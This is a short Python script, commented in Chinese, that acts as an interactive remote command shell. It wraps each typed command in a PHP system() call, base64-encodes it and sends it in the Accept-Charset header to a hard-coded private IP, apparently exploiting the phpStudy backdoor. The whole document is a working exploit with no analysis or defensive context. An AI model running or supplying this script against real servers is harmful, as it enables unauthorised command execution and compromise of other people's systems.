import requests
import base64

headers = {"Accept-Encoding":"gzip,deflate", # 固定格式
"Accept-Charset":""} # base64加密内容

url = r'http://192.168.150.133' # ip地址

while True:
    command = input(">> ")
    total_command = 'system({});'.format(command)
    command_base64 = base64.b64encode(total_command.encode())
    headers["Accept-Charset"] = command_base64
    res = requests.get(url=url,headers=headers)
    print(res.text) # 以text格式输出
